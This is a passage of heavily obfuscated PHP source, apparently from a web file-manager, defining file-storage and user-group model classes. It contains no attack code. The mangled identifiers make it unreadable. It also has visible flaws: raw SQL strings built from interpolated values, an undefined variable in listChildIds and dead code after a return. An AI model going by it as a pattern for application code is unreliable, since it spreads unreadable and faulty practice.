intval($‹Û¯ó¨[$æ£âÅÜ‘[79]]); if (!$‹Û¯ó¨[$æ£âÅÜ‘[79]] && strlen($‹Û¯ó¨[$æ£âÅÜ‘[681]]) > 32) { $‹Û¯ó¨[$æ£âÅÜ‘[79]] = intval(substr($‹Û¯ó¨[$æ£âÅÜ‘[681]], 32)); } $•ƒÁ’å = $this->add($‹Û¯ó¨); return $this->find($•ƒÁ’å); } public function addFile($½œ¹°ûú, $ó‰Ñæ¨, $ÓŠ» å§ = false) { $êëÔ³ƒ =& $_SERVER[ç¦¬”œš]; $îôçŠû§ = IO::hashSimple($½œ¹°ûú); $ŠÈ³Œò = IO::size($½œ¹°ûú); $Æ°ìÎŞ½ = $ŠÈ³Œò <= 1024 * 1024 * 10 ? IO::hashMd5($½œ¹°ûú) : $êëÔ³ƒ[12]; $æŠŒ°´ = $êëÔ³ƒ[2033] . $îôçŠû§; CacheLock::lock($æŠŒ°´); if ($Æ°ìÎŞ½ && $îôçŠû§) { $×¬›±Ğ = $this->addFileCheckExist($îôçŠû§, $Æ°ìÎŞ½, $ŠÈ³Œò); if ($×¬›±Ğ) { CacheLock::unlock($æŠŒ°´); return $×¬›±Ğ; } } $éŒü°ëŞ = $this->addFileMake($½œ¹°ûú, $ŠÈ³Œò, $îôçŠû§, $Æ°ìÎŞ½, $ó‰Ñæ¨, $ÓŠ» å§); $×È‡„¿– = $this->addFileData($éŒü°ëŞ); CacheLock::unlock($æŠŒ°´); if (!$Æ°ìÎŞ½ && $×È‡„¿–) { $this->fileMd5Check($×È‡„¿–); } return $×È‡„¿–; } public function fileMd5Check($ÉÓÎØì) { $­×ê³üØ =& $_SERVER[ç¦¬”œš]; $üı÷İó¹ = array($ÉÓÎØì[$­×ê³üØ[550]], $ÉÓÎØì[$­×ê³üØ[87]]); $ÒÉ®“ş = $­×ê³üØ[2034] . $ÉÓÎØì[$­×ê³üØ[87]]; $Ã››Ì¶ = $­×ê³üØ[2035] . $ÉÓÎØì[$­×ê³üØ[550]]; TaskQueue::add($­×ê³üØ[2036], $üı÷İó¹, $ÒÉ®“ş, $Ã››Ì¶); } public function fileMd5Set($‘ó¶Ğêª, $à­ù²ª‹) { $±™ø¢‚ =& $_SERVER[ç¦¬”œš]; $ØÌƒ¦Õİ = $this->find($‘ó¶Ğêª); if (!$ØÌƒ¦Õİ || $ØÌƒ¦Õİ[$±™ø¢‚[556]]) { return; } $ç¢ÏÙÜ· = IO::hashMd5($à­ù²ª‹); if (!$ç¢ÏÙÜ·) { return $±™ø¢‚[12]; } $this->where(array($±™ø¢‚[550] => $‘ó¶Ğêª))->save(array($±™ø¢‚[556] => $ç¢ÏÙÜ·)); } public function addFileMake($ªã¿ƒã, $˜öÍ”´„, $éÊá©í, $ü±§øº, $Îâ¬â­, $¤¿œù¹Ú) { $‹£×ìÄí =& $_SERVER[ç¦¬”œš]; $øë¾ü¨Î = $this->createFileName($Îâ¬â­, $éÊá©í, $ü±§øº); $ŒíìÈşõ = get_path_father($øë¾ü¨Î); $ê¤×Ÿ˜œ = get_path_this($øë¾ü¨Î); if ($¤¿œù¹Ú) { $ÛÄİ÷ö = IO::move($ªã¿ƒã, $ŒíìÈşõ, !1, $ê¤×Ÿ˜œ); } else { $ÛÄİ÷ö = IO::copy($ªã¿ƒã, $ŒíìÈşõ, !1, $ê¤×Ÿ˜œ); } if (!$ÛÄİ÷ö) { return !1; } $Ãáîç°´ = KodIO::defaultDriver(); $Ïğµ¼Ë = array($‹£×ìÄí[626] => $˜öÍ”´„, $‹£×ìÄí[2030] => 1, $‹£×ìÄí[503] => $Îâ¬â­, $‹£×ìÄí[888] => $Ãáîç°´[$‹£×ìÄí[484]], $‹£×ìÄí[504] => $øë¾ü¨Î, $‹£×ìÄí[2031] => $éÊá©í, $‹£×ìÄí[2032] => $ü±§øº); return $Ïğµ¼Ë; } public function addFileCheckExist($õ–Äúé, $Óí÷›™Ê, $İ¹æ“‹—) { $¥ÄÉ£‘Ø =& $_SERVER[ç¦¬”œš]; $ÒøËåÇú = $this->findByHash($õ–Äúé, $Óí÷›™Ê); if (!$ÒøËåÇú) { return !1; } $Åİ’“ÑÌ = array($¥ÄÉ£‘Ø[2030] => intval($ÒøËåÇú[$¥ÄÉ£‘Ø[2037]]) + 1, $¥ÄÉ£‘Ø[626] => $İ¹æ“‹—); $this->where(array($¥ÄÉ£‘Ø[551] => $ÒøËåÇú[$¥ÄÉ£‘Ø[550]]))->save($Åİ’“ÑÌ); return $ÒøËåÇú; } public function remove($®ÉÕ˜ñí) { $this->linkCountChange($®ÉÕ˜ñí, !1); $this->clearEmpty(); return !0; } public function linkAdd($ïö£ÊÍ™) { $this->linkCountChange($ïö£ÊÍ™, !0); } public function linkCountChange($› â„ø, $şÎ„š Œ) { $–°‚­Œ¤ =& $_SERVER[ç¦¬”œš]; if (!$› â„ø) { return; } if (!is_array($› â„ø)) { $› â„ø = array($› â„ø); } $¦¿ÈÔĞ÷ = array(); foreach ($› â„ø as $éöÌŞ¥ô) { $’Ô™¢À = $éöÌŞ¥ô . $–°‚­Œ¤[12]; if (!$¦¿ÈÔĞ÷[$’Ô™¢À]) { $¦¿ÈÔĞ÷[$’Ô™¢À] = 0; } $¦¿ÈÔĞ÷[$’Ô™¢À]++; } $İ´³˜± = array(); foreach ($¦¿ÈÔĞ÷ as $éöÌŞ¥ô => $ù·³±Ç) { $’Ô™¢À = $ù·³±Ç . $–°‚­Œ¤[12]; if (!$İ´³˜±[$’Ô™¢À]) { $İ´³˜±[$’Ô™¢À] = array(); } $İ´³˜±[$’Ô™¢À][] = $éöÌŞ¥ô; } foreach ($İ´³˜± as $ù·³±Ç => $ÓÌ«²ŠÒ) { if (!$ÓÌ«²ŠÒ) { continue; } $ù·³±Ç = $şÎ„š Œ ? $ù·³±Ç : -intval($ù·³±Ç); $…¥á€İı = array($–°‚­Œ¤[550] => array($–°‚­Œ¤[7], $ÓÌ«²ŠÒ)); if ($ù·³±Ç < 0) { $…¥á€İı[$–°‚­Œ¤[2037]] = array($–°‚­Œ¤[1094], abs($ù·³±Ç)); } $this->where($…¥á€İı)->setAdd($–°‚­Œ¤[2037], $ù·³±Ç); } } public function findByHash($·ÍåœùŞ, $âÎŞ¥ğÔ = false) { $í®Œ–ø† =& $_SERVER[ç¦¬”œš]; if (!$·ÍåœùŞ && !$âÎŞ¥ğÔ) { return !1; } $’¥˜ÍËú = array($í®Œ–ø†[2031] => $·ÍåœùŞ); if ($âÎŞ¥ğÔ) { $’¥˜ÍËú = array($í®Œ–ø†[2032] => $âÎŞ¥ğÔ); } return $this->order($í®Œ–ø†[2038])->where($’¥˜ÍËú)->find(); } public function clearEmpty($ã¯••¹† = 0) { $Ä¶¶í‰ï =& $_SERVER[ç¦¬”œš]; $ú˜Ü’€Á = time() - 3600 * 24 * $ã¯••¹†; $õêõá‡ = $Ä¶¶í‰ï[2039] . $ú˜Ü’€Á; $¹õ¤ãÚÂ = $this->where($õêõá‡)->select(); if (!$¹õ¤ãÚÂ) { return; } $ğ¾¬¿ÕË = new Task($Ä¶¶í‰ï[2040], $Ä¶¶í‰ï[12], count($¹õ¤ãÚÂ)); foreach ($¹õ¤ãÚÂ as $­Ãèé†) { $ğ¾¬¿ÕË->update(1); $this->resetFile($­Ãèé†); } $ğ¾¬¿ÕË->end(); } public function resetFile($Üç•“¼) { $†ç“ÈÃ” =& $_SERVER[ç¦¬”œš]; $÷¡‚À•Ú = array($†ç“ÈÃ”[551] => $Üç•“¼[$†ç“ÈÃ”[550]]); $à‰ô¸½Ï = Model($†ç“ÈÃ”[1419])->where($÷¡‚À•Ú)->count(); $’ñù¬© = Model($†ç“ÈÃ”[2041])->where($÷¡‚À•Ú)->count(); $Ñ¾éıÇ÷ = intval($à‰ô¸½Ï) + intval($’ñù¬©); if ($Ñ¾éıÇ÷ == 0) { IO::remove($Üç•“¼[$†ç“ÈÃ”[87]]); Model($†ç“ÈÃ”[2042])->delete($Üç•“¼[$†ç“ÈÃ”[550]]); $this->where($÷¡‚À•Ú)->delete(); $this->metaSet($Üç•“¼[$†ç“ÈÃ”[550]], null, null); write_log(ACTION . $†ç“ÈÃ”[2043] . KodUser::id() . $†ç“ÈÃ”[2044] . $Üç•“¼[$†ç“ÈÃ”[550]] . $†ç“ÈÃ”[2045] . $Üç•“¼[$†ç“ÈÃ”[79]] . $†ç“ÈÃ”[201] . $Üç•“¼[$†ç“ÈÃ”[87]], $†ç“ÈÃ”[2046]); return; } if ($Üç•“¼[$†ç“ÈÃ”[2037]] != $Ñ¾éıÇ÷) { $this->where($÷¡‚À•Ú)->save(array($†ç“ÈÃ”[2030] => $Ñ¾éıÇ÷)); } } public function storageInfo($†îÚáÂ = false) { $Šå¡€¶˜ =& $_SERVER[ç¦¬”œš]; $í™€¡ş = $this->count() + 0.0; $åÇÓŸ“ = 0; $…—Èíñæ = 1; $£óÙíî  = 0; $Ö†œ¹úÅ = 5000; for ($Í¸Ãşø‚ = 0; $Í¸Ãşø‚ < $í™€¡ş; $Í¸Ãşø‚ = $Í¸Ãşø‚ + $Ö†œ¹úÅ) { $…ï–şäö = $this->limit($Í¸Ãşø‚, $Í¸Ãşø‚ + $Ö†œ¹úÅ)->select(); foreach ($…ï–şäö as $‚‚ó—) { $…—Èíñæ += $‚‚ó—[$Šå¡€¶˜[79]] * $‚‚ó—[$Šå¡€¶˜[2037]]; $åÇÓŸ“ += $‚‚ó—[$Šå¡€¶˜[79]] * ($‚‚ó—[$Šå¡€¶˜[2037]] - 1); $£óÙíî  += $‚‚ó—[$Šå¡€¶˜[2037]]; } } $ÅÖªˆ¸Ñ = array($Šå¡€¶˜[2047] => $…—Èíñæ, $Šå¡€¶˜[2048] => $åÇÓŸ“, $Šå¡€¶˜[2049] => $åÇÓŸ“ / $…—Èíñæ, $Šå¡€¶˜[83] => $í™€¡ş, $Šå¡€¶˜[2050] => $£óÙíî ); return $ÅÖªˆ¸Ñ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\x65" => "\147\162\157\165\x70\x5f\155\145\x74\141", "\155\x65\x74\141\x46\x69\x65\x6c\x64" => "\147\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($âƒÍ ¯„) { $ç´ŞËå“ =& $_SERVER[ç¦¬”œš]; return array($ç´ŞËå“[2051] => array($âƒÍ ¯„[0], $ç´ŞËå“[2052]), $ç´ŞËå“[2053] => array($âƒÍ ¯„[0], $ç´ŞËå“[2054])); } protected function getInfo($›Ü¸¸†ü, $ôÀøªÀà = false) { $ÊïÜÔ÷Ä = $this->getInfoSimple($›Ü¸¸†ü); if (!$ÊïÜÔ÷Ä) { return !1; } if ($ôÀøªÀà) { return $this->_listDataApplyItem($ÊïÜÔ÷Ä); } return $this->cacheFunctionGet($_SERVER[ç¦¬”œš][2055], $›Ü¸¸†ü); } protected function getInfoSimple($î´·Ş¬¼, $´¨«ÅÚå = false) { $ùÚ¼Ÿ”” =& $_SERVER[ç¦¬”œš]; if ($´¨«ÅÚå) { $éÜ‘Ä§ = array($ùÚ¼Ÿ””[1969] => intval($î´·Ş¬¼)); $şê¿°õã = $this->where($éÜ‘Ä§)->find(); return is_array($şê¿°õã) ? $şê¿°õã : array(); } return $this->cacheFunctionGet($ùÚ¼Ÿ””[2056], $î´·Ş¬¼); } protected function groupAdd($ûØ£Ë·“) { $ºü±¦ÉÏ =& $_SERVER[ç¦¬”œš]; if (!$ûØ£Ë·“[$ºü±¦ÉÏ[192]] && isset($ûØ£Ë·“[$ºü±¦ÉÏ[1969]]) && $ûØ£Ë·“[$ºü±¦ÉÏ[1969]] == 1) { if ($ªô›‰Ö§ = $this->getInfoSimple($ûØ£Ë·“[$ºü±¦ÉÏ[1969]], !0)) { return $ûØ£Ë·“[$ºü±¦ÉÏ[1969]]; } } else { $ªô›‰Ö§ = $this->getInfoSimple($ûØ£Ë·“[$ºü±¦ÉÏ[192]]); if (!$ªô›‰Ö§) { return !1; } } $ƒ‹ËøˆÔ = $ºü±¦ÉÏ[603]; if ($ªô›‰Ö§[$ºü±¦ÉÏ[593]]) { $ƒ‹ËøˆÔ = $ªô›‰Ö§[$ºü±¦ÉÏ[593]] . $ªô›‰Ö§[$ºü±¦ÉÏ[1969]] . $ºü±¦ÉÏ[50]; } $ÎšœŞ–¼ = array($ºü±¦ÉÏ[503] => $this->groupNameAuto($ûØ£Ë·“[$ºü±¦ÉÏ[192]], $ûØ£Ë·“[$ºü±¦ÉÏ[32]]), $ºü±¦ÉÏ[486] => $ûØ£Ë·“[$ºü±¦ÉÏ[192]], $ºü±¦ÉÏ[661] => $ƒ‹ËøˆÔ, $ºü±¦ÉÏ[2057] => $ûØ£Ë·“[$ºü±¦ÉÏ[1955]], $ºü±¦ÉÏ[2058] => 0, $ºü±¦ÉÏ[1973] => 0); if (isset($ûØ£Ë·“[$ºü±¦ÉÏ[1993]])) { $ÎšœŞ–¼[$ºü±¦ÉÏ[1993]] = $ûØ£Ë·“[$ºü±¦ÉÏ[1993]]; } else { $Ã…‘€í‚ = $this->max($ºü±¦ÉÏ[1993]); if (!$Ã…‘€í‚) { $Ã…‘€í‚ = 0; } $ÎšœŞ–¼[$ºü±¦ÉÏ[1993]] = $Ã…‘€í‚ + 1; } if (!empty($ûØ£Ë·“[$ºü±¦ÉÏ[1969]])) { $ÎšœŞ–¼[$ºü±¦ÉÏ[1969]] = $ûØ£Ë·“[$ºü±¦ÉÏ[1969]]; } $ÁÈåŒàî = $this->add($ÎšœŞ–¼); $this->setNamePinyin($ÁÈåŒàî, $ÎšœŞ–¼[$ºü±¦ÉÏ[32]]); if (isset($ûØ£Ë·“[$ºü±¦ÉÏ[2059]])) { $this->metaSet($ÁÈåŒàî, array($ºü±¦ÉÏ[2059] => $ûØ£Ë·“[$ºü±¦ÉÏ[2059]], $ºü±¦ÉÏ[2060] => $ûØ£Ë·“[$ºü±¦ÉÏ[2060]])); unset($ûØ£Ë·“[$ºü±¦ÉÏ[2059]]); unset($ûØ£Ë·“[$ºü±¦ÉÏ[2060]]); } Model($ºü±¦ÉÏ[1419])->groupRootAdd($ÁÈåŒàî); $this->_clearCache($ûØ£Ë·“[$ºü±¦ÉÏ[192]]); return $ÁÈåŒàî; } protected function groupEdit($ÙŒİÒ¥æ, $Šú‹Í„•) { $İ¾€Õˆ =& $_SERVER[ç¦¬”œš]; $®àÕö‰Ç = $this->getInfoSimple($ÙŒİÒ¥æ); if (!$®àÕö‰Ç) { return !1; } if (!empty($Šú‹Í„•[$İ¾€Õˆ[192]])) { $ÀµÓÍˆŒ = $this->getInfoSimple($Šú‹Í„•[$İ¾€Õˆ[192]]); if (!$ÀµÓÍˆŒ) { return !1; } if ($®àÕö‰Ç[$İ¾€Õˆ[1969]] == $ÀµÓÍˆŒ[$İ¾€Õˆ[1969]]) { return !1; } if ($Šú‹Í„•[$İ¾€Õˆ[192]] != $®àÕö‰Ç[$İ¾€Õˆ[192]]) { if ($ÀµÓÍˆŒ[$İ¾€Õˆ[593]] !== $®àÕö‰Ç[$İ¾€Õˆ[593]] && strpos($ÀµÓÍˆŒ[$İ¾€Õˆ[593]], $®àÕö‰Ç[$İ¾€Õˆ[593]] . $®àÕö‰Ç[$İ¾€Õˆ[1969]] . $İ¾€Õˆ[50]) === 0) { return !1; } $Šú‹Í„•[$İ¾€Õˆ[661]] = $ÀµÓÍˆŒ[$İ¾€Õˆ[593]] . $Šú‹Í„•[$İ¾€Õˆ[192]] . $İ¾€Õˆ[50]; $this->_changeChildLevel($®àÕö‰Ç, $ÀµÓÍˆŒ); $this->_clearCache($ÀµÓÍˆŒ[$İ¾€Õˆ[1969]]); $this->_clearCache($®àÕö‰Ç[$İ¾€Õˆ[192]]); } } if (isset($Šú‹Í„•[$İ¾€Õˆ[32]])) { $this->setNamePinyin($ÙŒİÒ¥æ, $Šú‹Í„•[$İ¾€Õˆ[32]]); } if (isset($Šú‹Í„•[$İ¾€Õˆ[2059]])) { $this->metaSet($ÙŒİÒ¥æ, array($İ¾€Õˆ[2059] => $Šú‹Í„•[$İ¾€Õˆ[2059]], $İ¾€Õˆ[2060] => $Šú‹Í„•[$İ¾€Õˆ[2060]])); unset($Šú‹Í„•[$İ¾€Õˆ[2059]]); unset($Šú‹Í„•[$İ¾€Õˆ[2060]]); } $this->_clearChildrenCache($®àÕö‰Ç); return $this->where(array($İ¾€Õˆ[2061] => $ÙŒİÒ¥æ))->save($Šú‹Í„•); } private function _clearChildrenCache($è²¿ïöî) { $ıƒÜ½ =& $_SERVER[ç¦¬”œš]; $Äş·†ÂÎ = array($ıƒÜ½[661] => array($ıƒÜ½[621], $è²¿ïöî[$ıƒÜ½[593]] . $è²¿ïöî[$ıƒÜ½[1969]] . $ıƒÜ½[622])); $¯Ñ™‚¬« = $this->field($ıƒÜ½[1969])->where($Äş·†ÂÎ)->select(); foreach ($¯Ñ™‚¬« as $µÍÂÂ©) { $this->_clearCache($µÍÂÂ©[$ıƒÜ½[1969]]); } } private function _clearCache($ö·â¡ô) { $¿íÚĞ“Ÿ =& $_SERVER[ç¦¬”œš]; $this->cacheFunctionClear($¿íÚĞ“Ÿ[2055], $ö·â¡ô); $this->cacheFunctionClear($¿íÚĞ“Ÿ[2056], $ö·â¡ô); } private function _changeChildLevel($½Ù‘Ë«Ó, $‡«í‰ÕÑ, $©È¿Ø™ı = false) { $âê£¬ÖÎ =& $_SERVER[ç¦¬”œš]; $ı¡«œÀÔ = $½Ù‘Ë«Ó[$âê£¬ÖÎ[593]] . $½Ù‘Ë«Ó[$âê£¬ÖÎ[1969]] . $âê£¬ÖÎ[50]; $üœ‘âı  = $‡«í‰ÕÑ[$âê£¬ÖÎ[593]] . $‡«í‰ÕÑ[$âê£¬ÖÎ[1969]] . $âê£¬ÖÎ[50] . $½Ù‘Ë«Ó[$âê£¬ÖÎ[1969]] . $âê£¬ÖÎ[50]; if ($©È¿Ø™ı) { $üœ‘âı  = $‡«í‰ÕÑ[$âê£¬ÖÎ[593]] . $‡«í‰ÕÑ[$âê£¬ÖÎ[1969]] . $âê£¬ÖÎ[50]; } $î‚³µæ = array($âê£¬ÖÎ[661] => array($âê£¬ÖÎ[621], $½Ù‘Ë«Ó[$âê£¬ÖÎ[593]] . $½Ù‘Ë«Ó[$âê£¬ÖÎ[1969]] . $âê£¬ÖÎ[622])); $«¾ãã³Œ = array($âê£¬ÖÎ[661] => array($âê£¬ÖÎ[670], "\162\145\160\x6c\141\143\145\50\x70\141\x72\x65\156\x74\x4c\x65\x76\145\x6c\54\47{$ı¡«œÀÔ}\x27\x2c\47{$üœ‘âı }\47\51")); $this->_clearChildrenCache($½Ù‘Ë«Ó); $this->where($î‚³µæ)->data($«¾ãã³Œ)->save(); } public function setNamePinyin($†€œ€ÍÍ, $¢µÀãà = false) { $çê†°¯ =& $_SERVER[ç¦¬”œš]; if (!$¢µÀãà) { $£ƒ×Ô¹é = $this->getInfoSimple($†€œ€ÍÍ); $¢µÀãà = $£ƒ×Ô¹é[$çê†°¯[32]]; } if (!Input::check($¢µÀãà, $çê†°¯[664])) { $this->metaSet($†€œ€ÍÍ, $çê†°¯[547], null); $this->metaSet($†€œ€ÍÍ, $çê†°¯[546], null); return; } $ÕÒ÷½ãÌ = array($çê†°¯[547] => str_replace($çê†°¯[53], $çê†°¯[12], Pinyin::get($¢µÀãà)), $çê†°¯[546] => Pinyin::get($¢µÀãà, $çê†°¯[665])); $this->metaSet($†€œ€ÍÍ, $ÕÒ÷½ãÌ); } protected function groupStatus($·¼¤ü×, $§ˆİéûÅ) { $í»®Ÿ˜ =& $_SERVER[ç¦¬”œš]; $©Ş³•™© = $this->getInfoSimple($·¼¤ü×); if (!$©Ş³•™©) { return !1; } $this->_clearCache($·¼¤ü×); return $this->metaSet($·¼¤ü×, $í»®Ÿ˜[830], $§ˆİéûÅ); if ($§ˆİéûÅ == $í»®Ÿ˜[91]) { $ »û¯› = $this->parentLevelArray($©Ş³•™©[$í»®Ÿ˜[593]]); } else { } $ »û¯›[] = $©Ş³•™©[$í»®Ÿ˜[1969]]; $¦ûõó²‹ = array(); foreach ($ »û¯› as $·¼¤ü×) { $¦ûõó²‹[] = array($í»®Ÿ˜[1969] => $·¼¤ü×, $í»®Ÿ˜[97] => $í»®Ÿ˜[830], $í»®Ÿ˜[450] => $§ˆİéûÅ); $this->_clearCache($·¼¤ü×); } return Model($í»®Ÿ˜[2062])->addAll($¦ûõó²‹, array(), !0); } protected function groupRemove($¼å£‚, $×Œ„ÏÌ¥ = false) { $¹“Ÿ¥›” =& $_SERVER[ç¦¬”œš]; $¡ßã• = array($¹“Ÿ¥›”[1969] => $¼å£‚); $˜’¥ï¦• = $this->where($¡ßã•)->find(); if (!$˜’¥ï¦• || $˜’¥ï¦•[$¹“Ÿ¥›”[192]] == 0) { return !1; } if (!$×Œ„ÏÌ¥) { $Á‘¤”¹ù = $this->getInfoSimple($˜’¥ï¦•[$¹“Ÿ¥›”[192]]); $this->_changeChildLevel($˜’¥ï¦•, $Á‘¤”¹ù, !0); $this->where(array($¹“Ÿ¥›”[192] => $¼å£‚))->save(array($¹“Ÿ¥›”[192] => $˜’¥ï¦•[$¹“Ÿ¥›”[192]])); $this->_clearCache($Á‘¤”¹ù[$¹“Ÿ¥›”[1969]]); } Model($¹“Ÿ¥›”[2062])->where($¡ßã•)->delete(); Model($¹“Ÿ¥›”[2063])->where($¡ßã•)->delete(); Model($¹“Ÿ¥›”[904])->groupRootRemove($¼å£‚); $this->_clearCache($˜’¥ï¦•[$¹“Ÿ¥›”[192]]); return $this->where($¡ßã•)->delete(); } protected function groupSort($›îò˜¢®) { $î”İ¹ä˜ =& $_SERVER[ç¦¬”œš]; $»òÈ›ı = array(); foreach ($›îò˜¢® as $¢‡”øâ => $ğÉ÷¿Å¶) { $»òÈ›ı[] = array($î”İ¹ä˜[1969], $ğÉ÷¿Å¶, $î”İ¹ä˜[1993], $¢‡”øâ + 1); } $this->saveAll($»òÈ›ı); } public function listData() { $ïí»÷¿£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ïí»÷¿£[$_SERVER[ç¦¬”œš][445]]); return $ïí»÷¿£; } private function _makeOrder($¸°üáÁö = '') { $ÙÏêÁ¶ø =& $_SERVER[ç¦¬”œš]; $‡´×Ş‰Ã = array($ÙÏêÁ¶ø[1969], $ÙÏêÁ¶ø[32], $ÙÏêÁ¶ø[1957], $ÙÏêÁ¶ø[231]); $“ˆŞ´–ä = array($ÙÏêÁ¶ø[532] => $ÙÏêÁ¶ø[533], $ÙÏêÁ¶ø[534] => $ÙÏêÁ¶ø[535]); $ÍŸíœÕ = Input::get($ÙÏêÁ¶ø[539], $ÙÏêÁ¶ø[7], $ÙÏêÁ¶ø[1973], $‡´×Ş‰Ã); $ˆì…ëª× = Input::get($ÙÏêÁ¶ø[540], $ÙÏêÁ¶ø[7], $ÙÏêÁ¶ø[2064], array($ÙÏêÁ¶ø[2064], $ÙÏêÁ¶ø[534])); $ˆì…ëª× = $“ˆŞ´–ä[$ˆì…ëª×]; $¸°üáÁö = $¸°üáÁö . "{$ÍŸíœÕ}\x20{$ˆì…ëª×}\54\40\147\162\x6f\165\x70\x49\104\x20\141\163\x63"; return $this->order($¸°üáÁö); } public function listChild($“ÌËà–ƒ) { $§ÃÍÀ± =& $_SERVER[ç¦¬”œš]; $óæÒøÑ = $this->where(array($§ÃÍÀ±[192] => $“ÌËà–ƒ))->_makeOrder()->selectPage(200); $this->_listDataApply($óæÒøÑ[$§ÃÍÀ±[445]]); return $óæÒøÑ; } public function listChildIds($½Ó±²Ç–) { $Êî¥î¡´ =& $_SERVER[ç¦¬”œš]; if (is_string($‚Ì¤èˆË)) { $½Ó±²Ç– = explode($Êî¥î¡´[50], $½Ó±²Ç–); } $ª×úÅÊ = $this->where(array($Êî¥î¡´[1969] => array($Êî¥î¡´[7], $½Ó±²Ç–)))->field($Êî¥î¡´[2065])->select(); if (!$ª×úÅÊ) { return !1; } $éÚüê¯® = array(); foreach ($ª×úÅÊ as $Ñ¾ìã‘º) { $éÚüê¯®[] = "\163\x65\x6c\145\x63\x74\40\x67\x72\157\165\x70\x49\x44\x20\x66\162\157\x6d\40\x60\x67\x72\157\x75\160\x60\x20\x77\x68\145\162\145\40\160\x61\x72\x65\156\x74\114\x65\x76\145\154\x20\x6c\151\153\x65\x20\x27{$Ñ¾ìã‘º[$Êî¥î¡´[593]]}{$Ñ¾ìã‘º[$Êî¥î¡´[1969]]}\x2c\45\x27"; } $éÚüê¯® = implode($Êî¥î¡´[2066], $éÚüê¯®); $ª×úÅÊ = $this->query($éÚüê¯®); if (!$ª×úÅÊ) { return array(); } $½Ó±²Ç– = array_to_keyvalue($ª×úÅÊ, $Êî¥î¡´[12], $Êî¥î¡´[1969]); return array_unique($½Ó±²Ç–); } public function listByID($úşÈè©) { $¬Ä ¢Êú =& $_SERVER[ç¦¬”œš]; if (!$úşÈè©) { return array(); } $Õ“å¨«œ = array($¬Ä ¢Êú[1969] => array($¬Ä ¢Êú[7], $úşÈè©)); $ÏÒ¼´Ô = $this->where($Õ“å¨«œ)->select(); $ÏÒ¼´Ô = array_sort_keep($ÏÒ¼´Ô, $¬Ä ¢Êú[1969], $úşÈè©); $this->_listDataApply($ÏÒ¼´Ô); return $ÏÒ¼´Ô; } public function listSearch($³ôó£¬¹) { $à¥ô®âÖ =& $_SERVER[ç¦¬”œš]; $ç¢ŠÃÏ = trim($³ôó£¬¹[$à¥ô®âÖ[2067]]); $°©„ğìá = explode($à¥ô®âÖ[53], $ç¢ŠÃÏ); if (!$ç¢ŠÃÏ || count($°©„ğìá) == 1) { return $this->listSearchNow($³ôó£¬¹); } $´‚à­ÌÌ = array($à¥ô®âÖ[445] => array()); foreach ($°©„ğìá as $ÔÖ‘Ë×) { if (!trim($ÔÖ‘Ë×)) { continue; } $³ôó£¬¹[$à¥ô®âÖ[2067]] = $ÔÖ‘Ë×; $èÆ‚Şø = $this->listSearchNow($³ôó£¬¹); $´‚à­ÌÌ[$à¥ô®âÖ[445]] = array_merge($´‚à­ÌÌ[$à¥ô®âÖ[445]], $èÆ‚Şø[$à¥ô®âÖ[445]]); } $´‚à­ÌÌ[$à¥ô®âÖ[445]] = array_unique_by_key($´‚à­ÌÌ[$à¥ô®âÖ[445]], $à¥ô®âÖ[1969]); $´‚à­ÌÌ[$à¥ô®âÖ[442]] = array($à¥ô®âÖ[443] => count($´‚à­ÌÌ[$à¥ô®âÖ[445]]), $à¥ô®âÖ[439] => 20, $à¥ô®âÖ[429] => 1, $à¥ô®âÖ[444] => 1); return $´‚à­ÌÌ; } public function listSearchNow($¥ÎÌÕâ) { $«º–Ù› =& $_SERVER[ç¦¬”œš]; $Ş‰÷ñ·Õ = trim($¥ÎÌÕâ[$«º–Ù›[2067]]); $¸¦¡ÆĞÁ = isset($¥ÎÌÕâ[$«º–Ù›[2068]]) ? $¥ÎÌÕâ[$«º–Ù›[2068]] : !1; if (!trim($Ş‰÷ñ·Õ)) { return !1; } $Ş‰÷ñ·Õ = str_replace($«º–Ù›[2069], $«º–Ù›[2070], $Ş‰÷ñ·Õ); $ËïŠûÄá = array($«º–Ù›[1969] => array($«º–Ù›[459], "{$Ş‰÷ñ·Õ}\x25"), $«º–Ù›[32] => array($«º–Ù›[459], "\x25{$Ş‰÷ñ·Õ}\x25"), $«º–Ù›[1079] => $«º–Ù›[2071]); if ($¸¦¡ÆĞÁ) { $ºæ²ƒ˜å = $this->getInfoSimple($¸¦¡ÆĞÁ); $¾×†ò’Ì = $ºæ²ƒ˜å[$«º–Ù›[593]] . $¸¦¡ÆĞÁ . $«º–Ù›[622]; $ËïŠûÄá = array($ËïŠûÄá, array($«º–Ù›[593] => array($«º–Ù›[459], $¾×†ò’Ì))); } $ËïŠûÄá = $this->parseWhereLike($ËïŠûÄá); $Ò‹‡‘ä´ = $this->_makeOrder()->where($ËïŠûÄá)->selectPage(20); $Ò‹‡‘ä´ = $Ò‹‡‘ä´ ? $Ò‹‡‘ä´ : array($«º–Ù›[445] => array(), $«º–Ù›[442] => array()); if (!$Ò‹‡‘ä´ || count($Ò‹‡‘ä´[$«º–Ù›[445]]) < 5 && Input::check($Ş‰÷ñ·Õ, $«º–Ù›[394])) { $Š›Î¡àñ = $this->groupChildrenAll($¸¦¡ÆĞÁ); $Ñ€Šß¦÷ = $this->_searchFromMeta($«º–Ù›[546], $Ş‰÷ñ·Õ, 10, $Š›Î¡àñ); $øÍæšë„ = $this->_searchFromMeta($«º–Ù›[547], $Ş‰÷ñ·Õ, 10, $Š›Î¡àñ); $çŞ–ƒÑ = array_merge($Ñ€Šß¦÷, $øÍæšë„, $Ò‹‡‘ä´[$«º–Ù›[445]]); $Ò‹‡‘ä´[$«º–Ù›[445]] = array_unique_by_key($çŞ–ƒÑ, $«º–Ù›[1969]); $Ò‹‡‘ä´[$«º–Ù›[442]][$«º–Ù›[443]] = count($Ò‹‡‘ä´[$«º–Ù›[445]]); $Ò‹‡‘ä´[$«º–Ù›[442]][$«º–Ù›[444]] = ceil($Ò‹‡‘ä´[$«º–Ù›[442]][$«º–Ù›[443]] / $Ò‹‡‘ä´[$«º–Ù›[442]][$«º–Ù›[439]]); } $this->_listDataApply($Ò‹‡‘ä´[$«º–Ù›[445]]); return $Ò‹‡‘ä´; } protected function groupChildrenAll($§¤ÔĞ†ö) { $÷ü¦ş×– =& $_SERVER[ç¦¬”œš]; if (!$§¤ÔĞ†ö) { return !1; } if (!is_array($§¤ÔĞ†ö)) { $§¤ÔĞ†ö = array($§¤ÔĞ†ö); } $’éèªÑ… = $§¤ÔĞ†ö; foreach ($§¤ÔĞ†ö as 